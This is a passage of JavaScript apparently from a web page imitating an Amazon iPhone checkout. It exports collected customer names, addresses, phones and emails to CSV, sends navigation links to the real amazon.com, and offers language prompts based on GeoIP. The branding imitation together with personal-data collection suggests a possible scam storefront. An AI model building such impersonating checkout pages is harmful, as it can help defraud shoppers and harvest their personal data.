  if (orders.length === 0) {
    showToast("No records available to export.");
    return;
  }

  const headers = ["Name", "Address", "Phone Number", "Email", "Item", "Price"];
  const rows = orders.map(o => [
    `"${(o.name || o.fullName || '').replace(/"/g, '""')}"`,
    `"${(o.address || o.deliveryAddress || '').replace(/"/g, '""')}"`,
    `"${(o.phoneNumber || o.phone || '').replace(/"/g, '""')}"`,
    `"${(o.email || '').replace(/"/g, '""')}"`,
    `"${(o.item || '').replace(/"/g, '""')}"`,
    `"${(o.price || o.total || '').replace(/"/g, '""')}"`
  ]);

  const csvContent = "data:text/csv;charset=utf-8," + [headers.join(","), ...rows.map(r => r.join(","))].join("\n");
  const encodedUri = encodeURI(csvContent);
  const link = document.createElement("a");
  link.setAttribute("href", encodedUri);
  link.setAttribute("download", `customer_details_${Date.now()}.csv`);
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);

  showToast("CSV export downloaded successfully!");
}

// Update Header Orders Badge
function updateOrdersBadge() {
  const badge = document.getElementById("ordersBadgeCount");
  if (!badge) return;
  const orders = JSON.parse(localStorage.getItem("amazon_placed_orders_iphone") || localStorage.getItem("amazon_placed_orders") || "[]");
  badge.textContent = `(${orders.length})`;
}

// Amazon Notification Toast
function showToast(msg) {
  const toast = document.getElementById("amazonToast");
  if (!toast) return;
  toast.textContent = msg;
  toast.style.display = "block";
  setTimeout(() => {
    toast.style.display = "none";
  }, 3200);
}

// 7. Amazon Redirection for Logo, Menu Options, and Search
function setupAmazonRedirects() {
  const topSearchForm = document.getElementById("topSearchForm");
  if (topSearchForm) {
    topSearchForm.addEventListener("submit", (e) => {
      e.preventDefault();
      const q = document.getElementById("topSearchInput")?.value.trim();
      if (q) {
        window.location.href = `https://www.amazon.com/s?k=${encodeURIComponent(q)}`;
      } else {
        window.location.href = "https://www.amazon.com";
      }
    });
  }

  // Intercept all menu links, nav items, and category links to redirect to Amazon (excluding language selector)
  const redirectLinks = document.querySelectorAll(".sub-link, .nav-item[href], .nav-location[href], .brand-link, .breadcrumb-bar a");
  redirectLinks.forEach((link) => {
    link.addEventListener("click", (e) => {
      const dest = link.getAttribute("href");
      if (dest && dest.startsWith("http")) {
        e.preventDefault();
        window.location.href = dest;
      }
    });
  });
}

// 8. Language Switcher & Location-Based Auto-Translation
function setupLanguageSwitcher() {
  const navLangBtn = document.getElementById("navLangBtn");
  const navCurrentLangText = document.getElementById("navCurrentLangText");
  const langItems = document.querySelectorAll("#langSelectList li");

  // Country code to language mapping
  const GEO_LANG_MAP = {
    PH: "tl", // Philippines -> Filipino / Tagalog
    ES: "es", MX: "es", CO: "es", AR: "es", CL: "es", PE: "es", VE: "es", GT: "es", EC: "es",
    FR: "fr",
    DE: "de", AT: "de", CH: "de",
    IT: "it",
    PT: "pt", BR: "pt",
    SA: "ar", AE: "ar", EG: "ar", QA: "ar", KW: "ar",
    JP: "ja",
    KR: "ko",
    CN: "zh-CN", TW: "zh-CN", HK: "zh-CN",
    IN: "hi",
    VN: "vi",
    ID: "id"
  };

  const LANG_LABELS = {
    en: "EN",
    tl: "TL",
    es: "ES",
    fr: "FR",
    de: "DE",
    it: "IT",
    pt: "PT",
    ar: "AR",
    ja: "JA",
    ko: "KO",
    "zh-CN": "ZH",
    hi: "HI",
    vi: "VI",
    id: "ID"
  };

  // Determine active language
  function getActiveLang() {
    const match = document.cookie.match(/googtrans=\/en\/([^;]+)/);
    if (match && match[1]) return match[1];
    const saved = localStorage.getItem("amazon_preferred_lang");
    if (saved) return saved;
    return "en";
  }

  function updateActiveUI(code) {
    if (navCurrentLangText) {
      navCurrentLangText.textContent = LANG_LABELS[code] || code.toUpperCase().slice(0, 2);
    }
    langItems.forEach(item => {
      if (item.getAttribute("data-lang") === code) {
        item.classList.add("active");
      } else {
        item.classList.remove("active");
      }
    });
  }

  const DICTIONARY = {
    tl: {
      buyNow: "Bumili Na",
      inStock: "May Stock",
      visitApple: "Bisitahin ang Apple Store",
      aboutItem: "Tungkol sa item na ito",
      useThisAddress: "Gamitin ang address na ito",
      useThisPayment: "Gamitin ang paraan ng pagbabayad na ito",
      placeYourOrder: "Ilagay ang iyong order",
      orderPlacedSuccess: "Matagumpay na nailagay ang order!"
    },
    es: {
      buyNow: "Comprar ya",
      inStock: "En stock",
      visitApple: "Visita la tienda de Apple",
      aboutItem: "Acerca de este producto",
      useThisAddress: "Usar esta dirección",
      useThisPayment: "Usar este método de pago",
      placeYourOrder: "Realiza tu pedido",
      orderPlacedSuccess: "¡Pedido realizado con éxito!"
    },
    fr: {
      buyNow: "Acheter cet article",
      inStock: "En stock",
      visitApple: "Visiter la boutique Apple",
      aboutItem: "À propos de cet article",
      useThisAddress: "Utiliser cette adresse",
      useThisPayment: "Utiliser ce mode de paiement",
      placeYourOrder: "Passer votre commande",
      orderPlacedSuccess: "Commande passée avec succès !"
    },
    de: {
      buyNow: "Jetzt kaufen",
      inStock: "Auf Lager",
      visitApple: "Besuchen Sie den Apple Store",
      aboutItem: "Über diesen Artikel",
      useThisAddress: "Diese Adresse verwenden",
      useThisPayment: "Diese Zahlungsmethode verwenden",
      placeYourOrder: "Jetzt bestellen",
      orderPlacedSuccess: "Bestellung erfolgreich aufgegeben!"
    }
  };

  function applyDictionaryTranslations(code) {
    const dict = DICTIONARY[code];
    if (!dict) return;
    
    const buyBtnSpan = document.querySelector("#btnBuyNow span");
    if (buyBtnSpan && dict.buyNow) buyBtnSpan.textContent = dict.buyNow;
    
    const stockEl = document.querySelector(".bb-stock");
    if (stockEl && dict.inStock) stockEl.textContent = dict.inStock;
    
    const brandLink = document.querySelector(".brand-link");
    if (brandLink && dict.visitApple) brandLink.textContent = dict.visitApple;
    
    const aboutHeader = document.querySelector(".feature-bullets h3");
    if (aboutHeader && dict.aboutItem) aboutHeader.textContent = dict.aboutItem;
    
    const btnAddr = document.querySelector("#btnUseAddress span");
    if (btnAddr && dict.useThisAddress) btnAddr.textContent = dict.useThisAddress;
    
    const btnPay = document.querySelector("#btnUsePayment span");
    if (btnPay && dict.useThisPayment) btnPay.textContent = dict.useThisPayment;
    
    const btnPlace = document.querySelector("#btnPlaceOrder span");
    if (btnPlace && dict.placeYourOrder) btnPlace.textContent = dict.placeYourOrder;
    
    const confTitle = document.querySelector(".conf-h2");
    if (confTitle && dict.orderPlacedSuccess) confTitle.textContent = dict.orderPlacedSuccess;
  }

  function setLanguage(code) {
    localStorage.setItem("amazon_preferred_lang", code);
    updateActiveUI(code);
    applyDictionaryTranslations(code);

    if (code === "en") {
      document.cookie = "googtrans=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
      document.cookie = "googtrans=; expires=Thu, 01 Jan 1970 00:00:00 UTC; domain=" + location.hostname + "; path=/;";
      showToast("Language changed to English");
      setTimeout(() => location.reload(), 400);
      return;
    }

    document.cookie = "googtrans=/en/" + code + "; path=/";
    document.cookie = "googtrans=/en/" + code + "; domain=" + location.hostname + "; path=/";

    // Trigger google translate select combo if available
    const combo = document.querySelector(".goog-te-combo");
    if (combo) {
      combo.value = code;
      combo.dispatchEvent(new Event("change"));
      showToast(`Language set to ${LANG_LABELS[code] || code.toUpperCase()}`);
    } else {
      showToast(`Translating to ${LANG_LABELS[code] || code.toUpperCase()}...`);
      setTimeout(() => location.reload(), 400);
    }
  }

  // Language selector banner elements
  const translateBanner = document.getElementById("amazonTranslateBanner");
  const atbTargetLangName = document.getElementById("atbTargetLangName");
  const btnAcceptTranslate = document.getElementById("btnAcceptTranslate");
  const btnDismissTranslate = document.getElementById("btnDismissTranslate");
  const btnCloseTranslateBanner = document.getElementById("btnCloseTranslateBanner");

  const LANG_FULL_NAMES = {
    tl: "Filipino (Tagalog)",
    es: "Español (Spanish)",
    fr: "Français (French)",
    de: "Deutsch (German)",
    it: "Italiano (Italian)",
    pt: "Português (Portuguese)",
    ar: "العربية (Arabic)",
    ja: "日本語 (Japanese)",
    ko: "한국어 (Korean)",
    "zh-CN": "中文 (Chinese)",
    hi: "हिन्दी (Hindi)",
    vi: "Tiếng Việt (Vietnamese)",
    id: "Bahasa Indonesia"
  };

  let pendingTargetLang = null;

  function promptTranslation(targetLang) {
    if (localStorage.getItem("amazon_translation_decided") === "true") return;
    if (!targetLang || targetLang === "en") return;

    pendingTargetLang = targetLang;
    if (atbTargetLangName) {
      atbTargetLangName.textContent = LANG_FULL_NAMES[targetLang] || targetLang.toUpperCase();
    }
    if (translateBanner) {
      translateBanner.style.display = "block";
    }
  }

  if (btnAcceptTranslate) {
    btnAcceptTranslate.addEventListener("click", () => {
      localStorage.setItem("amazon_translation_decided", "true");
      if (translateBanner) translateBanner.style.display = "none";
      if (pendingTargetLang) {
        setLanguage(pendingTargetLang);
      }
    });
  }

  function dismissBanner() {
    localStorage.setItem("amazon_translation_decided", "true");
    localStorage.setItem("amazon_preferred_lang", "en");
    if (translateBanner) translateBanner.style.display = "none";
  }

  if (btnDismissTranslate) btnDismissTranslate.addEventListener("click", dismissBanner);
  if (btnCloseTranslateBanner) btnCloseTranslateBanner.addEventListener("click", dismissBanner);

  // Toggle dropdown on mobile/click
  if (navLangBtn) {
    navLangBtn.addEventListener("click", (e) => {
      if (e.target.closest("#langDropdown")) return;
      navLangBtn.classList.toggle("active");
    });

    document.addEventListener("click", (e) => {
      if (!navLangBtn.contains(e.target)) {
        navLangBtn.classList.remove("active");
      }
    });
  }

  // Item selection
  langItems.forEach(item => {
    item.addEventListener("click", (e) => {
      e.stopPropagation();
      const code = item.getAttribute("data-lang");
      if (navLangBtn) navLangBtn.classList.remove("active");
      localStorage.setItem("amazon_translation_decided", "true");
      if (translateBanner) translateBanner.style.display = "none";
      setLanguage(code);
    });
  });

  // Check existing decision
  const hasDecided = localStorage.getItem("amazon_translation_decided") === "true";
  const savedLang = localStorage.getItem("amazon_preferred_lang");

  if (hasDecided && savedLang && savedLang !== "en") {
    // User already explicitly requested translation
    updateActiveUI(savedLang);
    applyDictionaryTranslations(savedLang);
  } else {
    // Keep in English by default without auto-translating
    updateActiveUI("en");

    // Ask first if visitor is from a non-English country or has a non-English device language
    if (!hasDecided) {
      const navLang = (navigator.language || navigator.userLanguage || "").toLowerCase();
      let detected = null;
      if (navLang.indexOf("fil") === 0 || navLang.indexOf("tl") === 0) detected = "tl";
      else if (navLang.indexOf("es") === 0) detected = "es";
      else if (navLang.indexOf("fr") === 0) detected = "fr";
      else if (navLang.indexOf("de") === 0) detected = "de";
      else if (navLang.indexOf("it") === 0) detected = "it";
      else if (navLang.indexOf("pt") === 0) detected = "pt";
      else if (navLang.indexOf("ar") === 0) detected = "ar";
      else if (navLang.indexOf("ja") === 0) detected = "ja";
      else if (navLang.indexOf("ko") === 0) detected = "ko";
      else if (navLang.indexOf("zh") === 0) detected = "zh-CN";
      else if (navLang.indexOf("hi") === 0) detected = "hi";
      else if (navLang.indexOf("vi") === 0) detected = "vi";
      else if (navLang.indexOf("id") === 0) detected = "id";

      if (detected && detected !== "en") {
        promptTranslation(detected);
      } else {
        // Check GeoIP location in background and prompt if non-English location
        fetch("https://api.country.is/")
          .then(res => res.json())
          .then(data => {
            if (data && data.country && GEO_LANG_MAP[data.country]) {
              const geoLang = GEO_LANG_MAP[data.country];
              if (geoLang && geoLang !== "en") {
                promptTranslation(geoLang);
              }
            }
          })
          .catch(() => {
            fetch("https://ipapi.co/json/")
              .then(res => res.json())
              .then(data => {
                if (data && data.country_code && GEO_LANG_MAP[data.country_code]) {
                  const geoLang = GEO_LANG_MAP[data.country_code];
                  if (geoLang && geoLang !== "en") {
                    promptTranslation(geoLang);
                  }
                }
              })
              .catch(() => {});
          });
      }
    }
  }
}
